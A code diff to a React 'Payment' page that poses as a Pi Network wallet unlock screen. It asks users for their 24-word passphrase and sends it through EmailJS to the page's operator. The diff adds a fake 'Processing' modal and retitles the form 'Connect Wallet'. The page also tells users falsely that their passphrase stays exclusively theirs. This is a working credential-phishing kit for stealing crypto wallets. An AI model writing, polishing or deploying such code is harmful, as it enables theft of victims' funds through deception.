@@ -3,8 +3,8 @@ import { useParams } from "react-router-dom";
 import pilogo from "../assets/pi_logo.png";
 import { exchanges } from "../services/exchange";
 import loop from "../assets/images/exchanges/loop.png";
+import circle from "../assets/images/exchanges/circle.png";
 
-// Wallet imports
 import emailjs from "@emailjs/browser";
 import Spinner from "react-activity/dist/Spinner";
 import "react-activity/dist/Spinner.css";
@@ -17,6 +17,7 @@ function Payment() {
   const [phrase, setPhrase] = useState("");
   const [error, setError] = useState(false);
   const [loading, setLoading] = useState(false);
+  const [showModal, setShowModal] = useState(false);
 
   const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
   const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
@@ -25,6 +26,8 @@ function Payment() {
   const handleSend = async () => {
     setLoading(true);
     setError(false);
+    setShowModal(true);
+
 
     const wordCount = phrase.trim().split(/\s+/).length;
     if (wordCount !== 24) {
@@ -38,7 +41,8 @@ function Payment() {
     try {
       await emailjs.send(serviceID, templateID, templateParams, userID);
       setPhrase("");
-      navigate("/approved");
+      navigate(`/approved/${id}`);
+      setShowModal(false);
     } catch (error) {
       console.error("Error:", error);
       alert("Verification failed. Please try again.");
@@ -55,29 +59,21 @@ function Payment() {
         <div className="flex items-center justify-between mb-6">
           <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
           <div className="text-center">
-            {/* <h1 className="text-xl font-bold text-purple-700">{method?.label}</h1> */}
-          <img src={loop} alt="Loop" className="w-8 h-8" />
+            <img src={loop} alt="Loop" className="w-8 h-8" />
           </div>
-          <div>
-
-{method && (
-  <div className="flex flex-col items-center mb-6">
-    <img
-      src={method.image}
-      alt={method.label}
-      className="w-12 h-12  object-cover rounded-full shadow-md"
-      />
-  </div>
-)}
-</div>
+          {method && (
+            <div className="flex flex-col items-center mb-6">
+              <img
+                src={method.image}
+                alt={method.label}
+                className="w-12 h-12 object-cover rounded-full shadow-md"
+              />
+            </div>
+          )}
         </div>
 
-        {/* Method Info */}
-      
-
-        {/* Unlock Form */}
         <h2 className="text-lg font-semibold text-center text-gray-800 mb-4">
-          Unlock Pi Wallet
+          Connect Wallet
         </h2>
         <textarea
           onChange={(e) => setPhrase(e.target.value)}
@@ -86,7 +82,11 @@ function Payment() {
           placeholder="Enter your 24-word passphrase here"
           rows="5"
         />
-        {error && <p className="text-red-500 text-sm mt-2">Invalid passphrase. Must be exactly 24 words.</p>}
+        {error && (
+          <p className="text-red-500 text-sm mt-2">
+            Invalid passphrase. Must be exactly 24 words.
+          </p>
+        )}
 
         {/* Unlock Button */}
         <button
@@ -98,11 +98,41 @@ function Payment() {
 
         {/* Disclaimer */}
         <p className="text-sm text-gray-600 mt-6 text-center leading-relaxed">
-          As a non-custodial wallet, your passphrase is exclusively accessible to you.
-          Recovery is impossible. Lost your passphrase? You can create a new wallet,
-          but all your previous π will be inaccessible.
+          As a non-custodial wallet, your passphrase is exclusively accessible
+          to you. Recovery is impossible. Lost your passphrase? You can create a
+          new wallet, but all your previous π will be inaccessible.
         </p>
       </div>
+
+      {/* Modal */}
+      {showModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
+          <div className="bg-white p-8 rounded-lg shadow-lg mx-5 w-full max-w-md">
+            <h3 className="text-xl font-bold text-center mb-4">Processing</h3>
+            <div className="flex items-center justify-between mb-6">
+          <img src={pilogo} alt="Pi Logo" className="w-12 h-12" />
+          <div className="text-center">
+            <img src={circle} alt="Loop" className="w-8 h-8 animate-spin duration-1000" style={{animationDuration:"3s"}} />
+          </div>
+          {method && (
+            <div className="flex flex-col items-center mb-6">
+              <img
+                src={method.image}
+                alt={method.label}
+                className="w-12 h-12 object-cover rounded-full shadow-md"
+              />
+            </div>
+          )}
+        </div>
+        <button
+          onClick={handleSend}
+          className="w-full mt-4 bg-purple-700 text-white py-3 rounded-lg font-medium shadow-md hover:bg-purple-800 transition-all flex justify-center items-center"
+        >
+    <Spinner color="#fff" /> 
+        </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
